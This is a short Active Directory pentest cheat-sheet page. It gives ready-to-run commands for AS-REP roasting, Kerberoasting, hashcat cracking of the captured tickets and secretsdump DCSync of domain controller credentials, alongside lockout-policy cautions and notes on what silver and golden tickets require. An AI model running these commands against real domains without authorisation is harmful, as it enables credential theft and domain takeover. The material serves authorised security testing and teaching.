# AD authentication checks

[← Active Directory quick reference](../05-active-directory.md)

Check the account lockout policy before any password test. A threshold does not guarantee a safe number of attempts: other failures may already have counted against an account.

```bash
nxc smb <dc-ip> -u <user> -p '<password>' --pass-pol
```

## AS-REP roasting

An account without Kerberos pre-authentication can return material for offline password testing. Start with a known username or a scoped user list.

```bash
impacket-GetNPUsers <domain.tld>/ -dc-ip <dc-ip> -usersfile users.txt -no-pass -format hashcat
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

## Kerberoasting

A domain user can request a service ticket for an SPN. Prefer user-backed service accounts; machine and managed-service account passwords are usually impractical cracking targets.

```bash
impacket-GetUserSPNs -request -dc-ip <dc-ip> <domain.tld>/<user>
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

## Ticket and replication checks

A silver ticket is service-specific; it needs the service-account hash, domain SID, and target SPN. A golden ticket needs the `krbtgt` key and has a different scope. Do not swap the two hashes.

Directory replication of credentials requires the relevant replication rights. Confirm those rights before requesting a selected user's data.

```bash
impacket-secretsdump -just-dc <domain.tld>/<user>:<password>@<dc-ip>
```

Keep the account, source of each credential, and target service in your notes. NetNTLMv2 challenge-response material is not an NT hash for Pass the Hash.
